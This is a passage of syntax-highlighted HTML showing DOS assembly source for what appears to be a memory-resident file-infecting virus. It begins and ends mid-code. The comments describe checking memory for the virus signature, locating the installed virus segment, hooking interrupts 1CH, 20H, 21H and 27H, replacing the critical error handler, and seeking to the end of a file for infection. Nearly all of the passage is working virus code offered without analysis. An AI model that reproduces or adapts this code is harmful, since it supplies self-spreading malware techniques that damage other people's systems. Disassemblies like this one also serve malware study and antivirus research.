    </span><span class="sc6">RCL</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc1">; Move pointer to end of file</span><span class="sc0">

</span><span class="sc5">BP0500</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; \ No displacement</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4202H</span><span class="sc0">        </span><span class="sc1">; Move file pointer (EOF) function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc1">; Get installed virus segment</span><span class="sc0">

</span><span class="sc5">BP0510</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; \ Address zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">LDS</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc5">BD009C</span><span class="sc0">       </span><span class="sc1">; Load Int 27H vector</span><span class="sc0">
    </span><span class="sc6">LDS</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get vector from far jump</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">           </span><span class="sc1">; Save offset</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0780</span><span class="sc4">-</span><span class="sc5">V_SIGN</span><span class="sc0"> </span><span class="sc1">; Address from jump to old Int 27H</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0530</span><span class="sc0">          </span><span class="sc1">; Test virus signature in memory</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">BP0520</span><span class="sc0">          </span><span class="sc1">; Branch if found</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; Retrieve offset</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0770</span><span class="sc4">-</span><span class="sc5">V_SIGN</span><span class="sc0"> </span><span class="sc1">; Address from new Int 27H routine</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0530</span><span class="sc0">          </span><span class="sc1">; Test virus signature in memory</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">BP0520</span><span class="sc0">          </span><span class="sc1">; Branch if found</span><span class="sc0">
    </span><span class="sc6">LDS</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc5">BD0080</span><span class="sc0">       </span><span class="sc1">; Load Int 20H vector</span><span class="sc0">
    </span><span class="sc6">LDS</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get vector from far jump</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">           </span><span class="sc1">; Save offset</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0630</span><span class="sc4">-</span><span class="sc5">V_SIGN</span><span class="sc0"> </span><span class="sc1">; Address from jump to old Int 20H</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0530</span><span class="sc0">          </span><span class="sc1">; Test virus signature in memory</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">BP0520</span><span class="sc0">          </span><span class="sc1">; Branch if found</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; Retrieve offset</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0620</span><span class="sc4">-</span><span class="sc5">V_SIGN</span><span class="sc0"> </span><span class="sc1">; Address from new Int 27H routine</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0530</span><span class="sc0">          </span><span class="sc1">; Test virus signature in memory</span><span class="sc0">
</span><span class="sc5">BP0520</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc1">; Test virus signature in memory</span><span class="sc0">

</span><span class="sc5">BP0530</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; Clear register</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc2">4756H</span><span class="sc0"> </span><span class="sc1">; Look for virus signature</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0540</span><span class="sc0">          </span><span class="sc1">; Branch if not present</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">31H</span><span class="sc0"> </span><span class="sc1">; Look for rest of signature</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0550</span><span class="sc0">          </span><span class="sc1">; Branch if there</span><span class="sc0">
</span><span class="sc5">BP0540</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">          </span><span class="sc1">; Set no virus marker</span><span class="sc0">
</span><span class="sc5">BP0550</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">V_SIGN</span><span class="sc0">    </span><span class="sc1">; Subtract offset of signature</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">           </span><span class="sc1">; Test no virus marker</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc1">; Create far jump</span><span class="sc0">

</span><span class="sc5">BP0560</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0EAH</span><span class="sc0">         </span><span class="sc1">; Far jump</span><span class="sc0">
    </span><span class="sc6">STOSB</span><span class="sc0">               </span><span class="sc1">; Store jump instruction</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; \ Address routine</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">STOSW</span><span class="sc0">               </span><span class="sc1">; Store offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">           </span><span class="sc1">; Get segment</span><span class="sc0">
    </span><span class="sc6">STOSW</span><span class="sc0">               </span><span class="sc1">; Store segment</span><span class="sc0">
</span><span class="sc5">BP0570</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc1">; Install interrupts</span><span class="sc0">

</span><span class="sc5">BP0580</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0">  </span><span class="sc5">BP0570</span><span class="sc0">          </span><span class="sc1">; Dont install if yes</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc5">SEGREG</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get segment register</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">00ECH</span><span class="sc0">        </span><span class="sc1">; Address far jump table</span><span class="sc0">
    </span><span class="sc6">CLD</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0880</span><span class="sc0">    </span><span class="sc1">; Int 1CH routine</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0560</span><span class="sc0">          </span><span class="sc1">; Create Int 1CH far jump</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0620</span><span class="sc0">    </span><span class="sc1">; Int 20H routine</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0560</span><span class="sc0">          </span><span class="sc1">; Create Int 20H far jump</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0700</span><span class="sc0">    </span><span class="sc1">; Int 21H routine</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0560</span><span class="sc0">          </span><span class="sc1">; Create Int 21H far jump</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0770</span><span class="sc0">    </span><span class="sc1">; Int 27H routine</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0560</span><span class="sc0">          </span><span class="sc1">; Create Int 27H far jump</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; \ Address zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">BOOT</span><span class="sc0">
    </span><span class="sc6">CLI</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">00ECH</span><span class="sc0">        </span><span class="sc1">; Address Int 1CH far jump</span><span class="sc0">
    </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">BW0070</span><span class="sc0">       </span><span class="sc1">; Install as Int 1CH offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">I1C_OF</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">; Save old Int 1CH offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">           </span><span class="sc1">; Get this segment</span><span class="sc0">
    </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">BW0072</span><span class="sc0">       </span><span class="sc1">; Install as Int 1CH segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">I1C_SG</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">; Save old Int 1CH segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">00F1H</span><span class="sc0">        </span><span class="sc1">; Address Int 20H far jump</span><span class="sc0">
    </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">BW0080</span><span class="sc0">       </span><span class="sc1">; Install as Int 20H offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">I20_OF</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">; Save old Int 20H offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">           </span><span class="sc1">; Get this segment</span><span class="sc0">
    </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">BW0082</span><span class="sc0">       </span><span class="sc1">; Install as Int 20H segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">I20_SG</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">; Save old Int 20H segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">00F6H</span><span class="sc0">        </span><span class="sc1">; Address Int 21H far jump</span><span class="sc0">
    </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">BW0084</span><span class="sc0">       </span><span class="sc1">; Install as Int 21H offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">I21_OF</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">; Save old Int 21H offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">           </span><span class="sc1">; Get this segment</span><span class="sc0">
    </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">BW0086</span><span class="sc0">       </span><span class="sc1">; Install as Int 21H segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">I21_SG</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">; Save old Int 21H segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">00FBH</span><span class="sc0">        </span><span class="sc1">; Address Int 27H far jump</span><span class="sc0">
    </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">BW009C</span><span class="sc0">       </span><span class="sc1">; Install as Int 27H offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">I27_OF</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">; Save old Int 27H offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">           </span><span class="sc1">; Get this segment</span><span class="sc0">
    </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">BW009E</span><span class="sc0">       </span><span class="sc1">; Install as Int 27H segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">I27_SG</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">    </span><span class="sc1">; Save old Int 27H segment</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">STI</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc1">; Reset interrupts</span><span class="sc0">

    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">
</span><span class="sc5">BP0590</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc5">SEGREG</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get segment register</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">00F1H</span><span class="sc0">        </span><span class="sc1">; Address far jump table (2nd entry)</span><span class="sc0">
    </span><span class="sc6">CLD</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0630</span><span class="sc0">    </span><span class="sc1">; Jump to old Int 20H</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0560</span><span class="sc0">          </span><span class="sc1">; Create Int 20H far jump</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0720</span><span class="sc0">    </span><span class="sc1">; Alternate Int 21H routine</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0560</span><span class="sc0">          </span><span class="sc1">; Create Int 21H far jump</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0780</span><span class="sc0">    </span><span class="sc1">; Jump to old Int 27H</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0560</span><span class="sc0">          </span><span class="sc1">; Create Int 27H far jump</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc1">; Set Int 24H vector</span><span class="sc0">

</span><span class="sc5">BP0600</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; \ Address zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">BOOT</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0790</span><span class="sc0">    </span><span class="sc1">; \ Interrupt 24H routine</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">BW0090</span><span class="sc0">       </span><span class="sc1">; Install as Int 24H offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">I24_OF</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Save old Int 24H offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">           </span><span class="sc1">; Get this segment</span><span class="sc0">
    </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">BW0092</span><span class="sc0">       </span><span class="sc1">; Install as Int 24H segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">I24_SG</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Save old Int 24H segment</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">CRTERR</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Clear critical error flag</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc1">; Restore Int 24H vector</span><span class="sc0">

    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">
</span><span class="sc5">BP0610</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; \ Address zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">I24_OF</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get old Int 24H offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BW0090</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Restore Int 24H offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">I24_SG</span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get old Int 24H segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BW0092</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Restore Int 24H segment</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc1">; Interrupt 20H routine</span><span class="sc0">

</span><span class="sc5">BP0620</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0680</span><span class="sc0">

    </span><span class="sc1">; Interrupt 20H - jump to original routine</span><span class="sc0">

</span><span class="sc5">BP0630</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0EAH</span><span class="sc0">            </span><span class="sc1">; Far jump to Int 20H</span><span class="sc0">
</span><span class="sc5">I20_OF</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0136CH</span><span class="sc0">          </span><span class="sc1">; Original Int 20H offset</span><span class="sc0">
</span><span class="sc5">I20_SG</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">00291H</span><span class="sc0">          </span><span class="sc1">; Original Int 20H segment</span><span class="sc0">

    </span><span class="sc1">; Get relocation constant in SI</span><span class="sc0">

</span><span class="sc5">BP0640</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">          </span><span class="sc1">; Get return address</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set DS to CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0650</span><span class="sc0">          </span><span class="sc1">; \ Get current address</span><span class="sc0">
</span><span class="sc5">BP0650</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0650</span><span class="sc0">    </span><span class="sc1">; Subtract displacement from it</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">          </span><span class="sc1">; Branch to return address</span><span class="sc0">

    </span><span class="sc1">; Free or allocate memory functions</span><span class="sc0">

</span><span class="sc5">BP0660</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0640</span><span class="sc0">          </span><span class="sc1">; Get relocation constant in SI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get host segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">           </span><span class="sc1">; Get relevant segment</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">           </span><span class="sc1">; Are they the same?</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
